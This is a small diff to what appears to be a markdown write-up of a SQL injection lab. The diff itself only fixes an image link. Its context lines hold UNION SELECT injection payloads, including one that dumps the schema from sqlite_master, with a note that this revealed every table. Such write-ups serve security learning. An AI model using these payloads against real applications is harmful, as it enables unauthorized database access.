@@ -47,7 +47,7 @@ a%')) UNION SELECT 1,2,3,4,5,6,7,8,9--
 ```html
 asd')) UNION SELECT sql,2,3,4,5,6,7,8,9 FROM sqlite_master WHERE type='table'--
 ```
-1[Sql Images](../.Images/sql2.png)
+![Sql Images](../.Images/sql2.png)
 - This query successfully returned the **entire schema definition**, including all table names and their structures.  
 
 ---
